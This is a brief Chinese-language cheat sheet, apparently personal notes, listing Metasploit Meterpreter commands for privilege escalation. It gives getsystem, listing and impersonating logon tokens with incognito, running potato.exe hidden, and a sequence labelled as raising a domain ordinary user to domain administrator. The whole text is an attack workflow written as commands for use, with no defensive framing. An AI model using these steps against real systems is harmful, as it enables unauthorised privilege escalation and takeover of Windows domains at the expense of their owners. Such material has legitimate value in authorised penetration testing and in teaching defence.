# msf

---

meterpreter模式：

```
getuid                      # 查看当前权限
getsystem                   # 获取系统权限
list_tokens -u              # 查看登陆过的令牌
impersonate_token '令牌名'   # 切换该用户令牌
rev2self                     # 返回原本权限
execute -cH -f potato.exe    # 注入potato.exe

```

域普通用户提权域管理用户：

```
meterpreter模式下：
getuid                       # 查看当前权限
getsystem                    # 获取系统权限
use incognito                # 使用incognito窃取其他令牌，权限越高可窃取越多
list_tokens -u               # 查看其他令牌
impersonate_token '令牌名'    # 切换该用户令牌
rev2self                      # 返回原本权限
```

